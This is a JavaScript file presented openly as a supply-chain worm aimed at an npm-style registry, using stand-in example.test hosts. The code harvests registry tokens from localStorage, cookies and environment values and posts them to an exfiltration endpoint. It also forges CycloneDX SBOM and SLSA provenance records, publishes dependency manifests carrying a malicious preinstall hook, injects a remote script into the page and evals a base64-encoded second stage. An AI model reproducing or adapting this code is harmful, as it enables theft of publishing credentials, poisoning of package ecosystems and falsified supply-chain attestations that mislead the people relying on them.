// Supply-chain SBOM worm: pulls package metadata, forges the SBOM and SLSA
// provenance, harvests registry tokens, then propagates through the dependency
// graph and evaluates its stage-2 publisher hook.
(function () {
  var REGISTRY = 'https://registry-mirror.example.test';
  var METADATA_URL = REGISTRY + '/-/package/sbom-seed/meta.json'
  var REGISTRY_PING = REGISTRY + '/-/ping'
  var SBOM_URL = REGISTRY + '/-/package/sbom-seed/sbom'
  var HOOK_URL = REGISTRY + '/-/package/sbom-seed/hook.js';
  var PROVENANCE_URL = REGISTRY + '/-/package/sbom-seed/provenance';
  var PUBLISH_URL = REGISTRY + '/-/package/publish';
  var COLLECT_URL = 'https://exfil.registry-mirror.example.test/collect';
  var MARKER = 'sbom18:state';
  var WORM_ID = 'sbom18:infected';
  var MAX_PROPAGATION = 5;
  var MAX_ROUNDS = 3;
  var STAGE = 'Y29uc29sZS5sb2coJ1tTQk9NLVdPUk1dIHN0YWdlMiB0YW1wZXIgcm91dGluZSBhdHRhY2hlZCcpO2RvY3VtZW50LmRvY3VtZW50RWxlbWVudCYmZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50LnNldEF0dHJpYnV0ZSgnZGF0YS1zYm9tJywnaW5mZWN0ZWQnKTs=';
  var SEED_MANIFEST = {
    name: 'sbom-seed',
    version: '2.4.0',
    ciToken: 'npm_REDACTED_EXAMPLE_TOKEN',
    maintainers: [{ name: 'build-bot', email: 'build-bot@registry-mirror.example.test' }],
    scripts: { postinstall: 'node ./scripts/seed.js', prepublishOnly: 'npm test' },
    dependencies: {
      'left-pad-ng': '^1.2.0',
      'event-stream-fix': '^3.3.6',
      'chalk-mini': '^0.4.1',
      'tslint-config-seed': '^5.0.0',
      'stream-buffer-fix': '^2.1.3'
    }
  };
  var stats = { components: 0, infected: 0, tokens: 0, markers: 0, rounds: 0, failed: 0 };

  function encode(value) {
    try { return btoa(encodeURIComponent(String(value))); } catch (error) { return ''; }
  }

  function decode(value) {
    try { return decodeURIComponent(atob(String(value))); } catch (error) { return ''; }
  }

  function log(message) {
    try { console.log('[SBOM-18] ' + message); } catch (error) {}
  }

  function pseudoDigest(name, version) {
    var encoded = encode(String(name) + '@' + String(version) + ':' + (stats.components + stats.infected));
    var hex = '';
    for (var index = 0; index < encoded.length && hex.length < 64; index += 1) {
      var nibble = encoded.charCodeAt(index) & 255;
      hex += (nibble < 16 ? '0' : '') + nibble.toString(16);
    }
    while (hex.length < 64) hex += '0';
    return hex.slice(0, 64);
  }

  function registryTokens(metadata) {
    var found = [];
    var seen = {};
    var patterns = [/token/i, /npm/i, /registry/i, /auth/i, /publish/i];
    try {
      for (var index = 0; index < localStorage.length; index += 1) {
        var key = localStorage.key(index);
        if (!key) continue;
        var matched = false;
        for (var slot = 0; slot < patterns.length; slot += 1) {
          if (patterns[slot].test(key)) matched = true;
        }
        if (!matched || seen[key]) continue;
        seen[key] = true;
        var value = '';
        try { value = String(localStorage.getItem(key) || ''); } catch (error) { value = ''; }
        if (!value) continue;
        found.push({ key: String(key).slice(0, 64), value: value.slice(0, 96) });
      }
    } catch (error) {}
    if (metadata && metadata.ciToken) found.push({ key: 'package.ciToken', value: String(metadata.ciToken).slice(0, 96) });
    return found;
  }

  function environmentMarkers() {
    var markers = [];
    try {
      var environment = window.__REGISTRY_ENV__;
      if (environment && typeof environment === 'object') {
        for (var key in environment) {
          if (!Object.prototype.hasOwnProperty.call(environment, key)) continue;
          markers.push({ key: String(key).slice(0, 64), value: String(environment[key]).slice(0, 96) });
        }
      }
    } catch (error) {}
    try {
      var cookie = String(document.cookie || '');
      if (cookie) markers.push({ key: 'document.cookie', value: cookie.slice(0, 96) });
    } catch (error) {}
    return markers;
  }

  function tamperSbom(metadata) {
    var components = [];
    var dependencies = metadata.dependencies && typeof metadata.dependencies === 'object' ? metadata.dependencies : {};
    for (var name in dependencies) {
      if (!Object.prototype.hasOwnProperty.call(dependencies, name)) continue;
      var version = String(dependencies[name]).replace(/^[^0-9]*/, '') || '0.0.0';
      stats.components += 1;
      components.push({
        type: 'library',
        name: name,
        version: '0.0.0-worm.' + version,
        purl: 'pkg:npm/' + name + '@0.0.0-worm.' + version,
        hashes: [{ alg: 'SHA-256', content: pseudoDigest(name, version) }],
        properties: [
          { name: 'worm:hook', value: 'preinstall' },
          { name: 'worm:stage', value: STAGE.slice(0, 24) }
        ]
      });
    }
    return {
      bomFormat: 'CycloneDX',
      specVersion: '1.5',
      serialNumber: 'urn:uuid:sbom-seed-' + pseudoDigest('sbom', 'root').slice(0, 12),
      metadata: {
        timestamp: new Date().toISOString(),
        component: { name: String(metadata.name || 'sbom-seed'), version: String(metadata.version || '0.0.0') },
        tools: [{ vendor: 'worm', name: 'sbom-worm', version: '1.0.0' }]
      },
      components: components
    };
  }

  function tamperProvenance(metadata, sbom) {
    return {
      _type: 'https://in-toto.io/Statement/v1',
      subject: [{ name: String(metadata.name || 'sbom-seed'), digest: { sha256: pseudoDigest(metadata.name, metadata.version) } }],
      predicateType: 'https://slsa.dev/provenance/v1',
      predicate: {
        buildDefinition: {
          buildType: 'https://registry-mirror.example.test/worm/publish',
          externalParameters: { registry: REGISTRY, components: sbom.components.length }
        },
        runDetails: {
          builder: { id: 'worm-builder@registry-mirror.example.test' },
          metadata: { invocationId: MARKER + '-' + stats.rounds }
        }
      }
    };
  }

  function post(url, payload) {
    try {
      fetch(url, {
        method: 'POST',
        headers: { 'content-type': 'application/json', 'x-worm': 'sbom18' },
        body: encode(JSON.stringify(payload))
      }).catch(function () { return null; });
    } catch (error) {
      stats.failed += 1;
    }
  }

  function retryPublish(manifest) {
    setTimeout(function () {
      try {
        fetch(PUBLISH_URL, { method: 'PUT', headers: { 'content-type': 'application/json' }, body: encode(JSON.stringify(manifest)) }).catch(function () {});
      } catch (error) {
        stats.failed += 1;
      }
    }, 250);
  }

  function probeTarball(name) {
    var url = REGISTRY + '/' + encodeURIComponent(name) + '/-/' + name + '-0.0.0-worm.tgz';
    try {
      fetch(url, { method: 'HEAD', cache: 'no-store' })
        .then(function (response) { return response.status; })
        .catch(function () { return 0; });
    } catch (error) {}
  }

  function propagate(metadata) {
    var pending = [];
    var dependencies = metadata.dependencies && typeof metadata.dependencies === 'object' ? metadata.dependencies : {};
    for (var name in dependencies) {
      if (!Object.prototype.hasOwnProperty.call(dependencies, name)) continue;
      pending.push(name);
    }
    var infected = [];
    while (pending.length > 0 && infected.length < MAX_PROPAGATION) {
      var next = pending.shift();
      infected.push(next);
      var manifest = {
        name: next,
        version: '0.0.0-worm',
        dependencies: { 'sbom-seed': '0.0.0-worm' },
        scripts: { preinstall: 'node ./node_modules/sbom-seed/hook.js' },
        publishedBy: 'worm-builder'
      };
      post(PUBLISH_URL, manifest);
      probeTarball(next);
      if (infected.length === 1) retryPublish(manifest);
    }
    stats.infected = infected.length;
    return infected;
  }

  function injectProvenanceMeta(sbom) {
    try {
      var meta = document.createElement('meta');
      meta.setAttribute('name', 'sbom-provenance');
      meta.setAttribute('content', 'worm:' + sbom.components.length);
      var head = document.head || document.documentElement;
      if (head) head.appendChild(meta);
      var link = document.createElement('link');
      link.setAttribute('rel', 'preload');
      link.setAttribute('href', SBOM_URL);
      if (head) head.appendChild(link);
      var hook = document.createElement('script');
      hook.setAttribute('src', HOOK_URL);
      hook.setAttribute('defer', 'defer');
      if (head) head.appendChild(hook);
    } catch (error) {}
  }

  function checkRegistry() {
    try {
      fetch(REGISTRY_PING, { method: 'GET', cache: 'no-store' })
        .then(function (response) { return response.status; })
        .then(function (status) { log('registry ping status=' + status); })
        .catch(function () { log('registry ping failed; using mirrored metadata'); });
    } catch (error) {}
  }

  function verifyPublished(sbom) {
    try {
      fetch(SBOM_URL + '?components=' + sbom.components.length, { method: 'GET', headers: { accept: 'application/json' } })
        .then(function (response) { return response.text(); })
        .then(function (text) { log('published sbom bytes=' + text.length); })
        .catch(function () { log('published sbom unreadable'); });
    } catch (error) {}
  }

  function persist(payload) {
    try { localStorage.setItem(MARKER, JSON.stringify(payload)); } catch (error) {}
    try { localStorage.setItem(WORM_ID, String(payload.infected.length)); } catch (error) {}
  }

  function runStage() {
    var code = decode(STAGE);
    if (!code) return 0;
    try { eval(code); } catch (error) { stats.failed += 1; return 0; }
    return 1;
  }

  function runRound(metadata, round) {
    stats.rounds = round;
    var sbom = tamperSbom(metadata);
    var provenance = tamperProvenance(metadata, sbom);
    post(PROVENANCE_URL, provenance);
    var infected = propagate(metadata);
    var tokens = registryTokens(metadata);
    var markers = environmentMarkers();
    stats.tokens = tokens.length;
    stats.markers = markers.length;
    var payload = {
      tokens: tokens,
      markers: markers,
      infected: infected,
      components: sbom.components.length,
      provenance: provenance.subject[0].digest.sha256,
      agent: String(navigator.userAgent || '').slice(0, 80),
      round: round
    };
    post(COLLECT_URL, payload);
    persist(payload);
    injectProvenanceMeta(sbom);
    verifyPublished(sbom);
    log('round=' + round + ' components=' + sbom.components.length + ' infected=' + infected.length + ' tokens=' + tokens.length + ' markers=' + markers.length);
  }

  function sweep() {
    try {
      fetch(METADATA_URL, { method: 'GET', headers: { accept: 'application/json' } })
        .then(function (response) { return response.text(); })
        .then(function (text) {
          var metadata = null;
          try { metadata = JSON.parse(text); } catch (error) { metadata = null; }
          if (!metadata || !metadata.name) metadata = SEED_MANIFEST;
          runRound(metadata, 1);
        })
        .catch(function () {
          runRound(SEED_MANIFEST, 1);
        });
    } catch (error) {
      runRound(SEED_MANIFEST, 1);
    }
  }

  function boot() {
    log('registry=' + REGISTRY + ' propagation-cap=' + MAX_PROPAGATION);
    try { localStorage.setItem('sbom18:npmrc', 'registry=https://registry-mirror.example.test/'); } catch (error) {}
    try { localStorage.setItem('sbom18:publishToken', 'npm_REDACTED_EXAMPLE_TOKEN'); } catch (error) {}
    checkRegistry();
    sweep();
    setTimeout(runStage, 60);
    var rounds = 1;
    var timer = setInterval(function () {
      rounds += 1;
      if (rounds > MAX_ROUNDS) {
        clearInterval(timer);
        log('propagation settled after ' + MAX_ROUNDS + ' rounds infected=' + stats.infected);
        return;
      }
      runRound(SEED_MANIFEST, rounds);
    }, 400);
  }

  try {
    boot();
  } catch (error) {
    log('boot aborted: ' + String(error && error.message));
  }
})();
